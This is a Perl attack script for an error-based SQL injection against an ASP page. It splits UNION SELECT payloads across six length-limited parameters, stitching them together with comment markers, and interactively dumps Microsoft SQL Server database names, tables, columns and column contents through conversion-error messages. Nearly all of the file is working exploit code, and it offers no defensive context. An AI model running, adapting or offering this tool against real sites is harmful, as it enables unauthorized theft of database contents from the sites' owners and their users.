#!/usr/bin/perl

# this was coded to exploit a trickkyyy SQL Injection vulnerability.
# The affected resource had 6 parameters vulnerable, however their values
# had a max-length enforced server-side, causing payloads being truncated
# if too long.
# All parameters were ending in the same SQL query, therefore this script
# was coded to split the SQL payload into 6 parts, each being injected in
# a different parameter, whilst ensuring the max-length for any given input
# would not exceed the configured value. To avoid SQL syntax errors, the 
# SQL payload bits were contatenated together by adding a "start comment"
# characters at the end of parameter's payload, and a "end comment" chars 
# at the beginning of the next parameter's injection.
# this resulted in full SQL payloads being executed successfully.

# Coded sometime in July 2011

use IO::Socket;
use LWP::UserAgent;


$regexp = "Conversion failed when converting the nvarchar value '([^']+)' to data";
$rand = rand(100);
$fname = "zzz-".$rand.".log";
if (!open FILE, '>', $fname) {
	die "[-] Can't open log file\n";
}



while ($ch !~ /e/) {
	print "\n[+] Interactive menu:\n    1 - Dumps all databases, using INFORMATION_SCHEMA\n".
	 "    2 - Dumps all databases, using SYSDATABASES\n    3 - ".
	 "Extracts tables name from a specific DB\n    4 - Extracts all columns from a specific table and DB\n".
	 "    5 - Extract selected columns of a selected table and db\n    e - exit\n\n[+] Choice: ";
	chomp(my $ch = <STDIN>);
	main($ch);
}

close(FILE);


sub main() {
	my $ch = $_[0];
	if ($ch == 1) {
		print "\n\n[+] Dumping all databases, using INFORMATION_SCHEMA\n\n\n";
		fprint("\n[+] Dump: databases enumeration using INFORMATION_SCHEMA\n");
		hj('1is');
	}
	elsif ($ch == 2) {
		print "\n\n[+] Dumping all databases, using SYSDATABASES\n\n\n";
		fprint("\n[+] Dump: databases enumeration using SYSDATABASES\n");
		hj('1sd');
	}
	elsif ($ch == 3) {
		print "\n\n[+] Extracting tables name, (blank) for default DB.\n    DB: ";
		chomp($db = <STDIN>);

		if (length($db) > 1) {
			fprint("\n[+] Dump: tables name from db[$db]\n");
			$DB = 1;
			$db =~ s/(.+)/$1../;
		}
		else {
			fprint("\n[+] Dump: tables name from the current DB\n");
			$DB = 0;
		}
		hj(2);
	}
	elsif ($ch == 4) {
		print "\n\n[+] Extracting columns name from table: ";
		chomp($table = <STDIN>);
		fprint("\n[+] Dump: columns field of table[$table]\n");
		hj('3is');

	}
	elsif ($ch == 5) {
		print "\n\n[+] Extracting selected column(s) from selected table\n".
			 "    [+] Column: ";
		chomp($column = <STDIN>);
		print "    [+] Table: ";
		chomp($table = <STDIN>);

		fprint("\n[+] Dump: column[$column] from table[$table]\n");
		hj(4);
	}
}



sub hj() {
	my $a = $_[0];
	$stop = 0;
	my $limit_a = 1;
	my $limit_b = 1;
	while ($stop < 4) {
		prepare_req($a,$limit_a,$limit_b);

		$limit_a++;
		$limit_b++;
	

	}
	$stop = 0;

}





sub prepare_req() {
	my($op,$lim_a,$lim_b) = @_;
	my @values;
	if ($op =~ /1is/) {
		# extracts all databases name from INFORMATION_SCHEMA

		@values = ("*/in (select top :LIM_B: schema_name from information_schema.schemata)--",
				 "*/ where /*",
				 "*/convert(int,schema_name)from /*",
				 "*/information_schema.schemata/*",
				 "*/schema_name not /*");
	}
	elsif ($op =~ /1sd/) {
		# extracts all databases name from SYSDATABASES

		@values = ("*/ master..sysdatabases)--",
				 "*/(select top :LIM_B:/*",
				 "*/convert(int,name) from/*",
				 "*/master..sysdatabases where name not in/*",
				 "*/ name from /*");
	}
	elsif ($op == 2) {
		# extracts all tables from a choosen DB

		@values = ("*/name from :DB:sysobjects where xtype='U')--",
				 "*/ name not in /*",
				 "*/convert(int,name) from /*",
				 "*/:DB:sysobjects where xtype='U' and /*",
				 "*/(select top :LIM_B: /*");
	}
	elsif ($op =~ /3is/) {
		# extracts all columns from a selected table with INFORMATION_SCHEMA




		@values = ("*/ in (select top :LIM_B: column_name from information_schema.columns where table_name=':TABLE:')--",
				 "*/=':TABLE:' and /*",
				 "*/convert(int,column_name)from /*",
				 "*/information_schema.columns where table_name/*",
				 "*/column_name not /*");
	}
	elsif ($op =~ /3sd/) {
		# extracts all columns from a selected table with SYSCOLUMNS

	}
	elsif ($op == 4) {

		@values = ("*/(select top :LIM_B: :COLUMN: from :TABLE:)--",
				 "*/ not /*",
				 "*/convert(int,:COLUMN:)from /*",
				 "*/:TABLE: where :COLUMN:/*",
				 "*/in /*");

	}


	my @pars = ("Param1=","&Param2=","&Param3=","&Param4=","&Param5=","&Param6=","&action=submit");
	my $str = "";
	my $c = 0;
	my @nvalues;
	foreach my $v(@values) {
		my $nv = $v;
		if ($nv =~ /:LIM_B:/) {
			$nv =~ s/:LIM_B:/$lim_b/;
		}
		if ($nv =~ /:DB:/) {
			if ($DB == 1) {
				$nv =~ s/:DB:/$db/;
			}
			else {
				$nv =~ s/:DB://;
			}
		}
		if ($nv =~ /:TABLE:/g) {
			$nv =~ s/:TABLE:/$table/g;
		}
		if ($nv =~ /:COLUMN:/g) {
			$nv =~ s/:COLUMN:/$column/g;
		}
		push(@nvalues,$nv);
	}



	while (my $v = <@pars>) {
		$c++;
		if ($c == 1) {
			$str .= $v."'union select top ".$lim_a." null,/*";
		}

		elsif ($c == 2) {
			$str .= $v.$nvalues[0];
		}
		elsif ($c == 3) {
			$str .= $v.$nvalues[1];
		}
		elsif ($c == 4) {
			$str .= $v.$nvalues[2];
		}
		elsif ($c == 5) {
			$str .= $v.$nvalues[3];
		}
		elsif ($c == 6) {
			$str .= $v.$nvalues[4];
		}

		elsif ($c == 7) {
			$str .= $v;
		}
	}
	#print "STR: $str\n";

	get_req($str);


}




#"Conversion failed when converting the nvarchar value '([^']+)' to data";'





sub get_req() {
	my $req = $_[0];
	my $host = "https://site/url.asp?";


	my $link = $host.$req;
	$link = encode($link);#print "$link\n";
	my $content;
	my $ua = LWP::UserAgent->new();
	$ua->timeout(4);
	my $response = $ua->get($link);
	#if ($response->is_success) {
		$content = $response->content;#print "\n$content\n";
	#}
 #else {
 #    die $response->status_line;
 #}

	if ($content =~ /$regexp/) {
		my $info = $1;
		print "    $info\n";
		fprint("    $info\n");
	}
	else {
		$stop++;
		print "    -\n";
		fprint("    -\n");
	}
}


sub fprint() {
	my $mess = $_[0];
	print FILE $mess;
}



sub encode() {
     my $str = $_[0];
     $str =~ s/ /%20/g;
     $str =~ s/'/%27/g;
     $str =~ s/!/%21/g;
     return($str);
}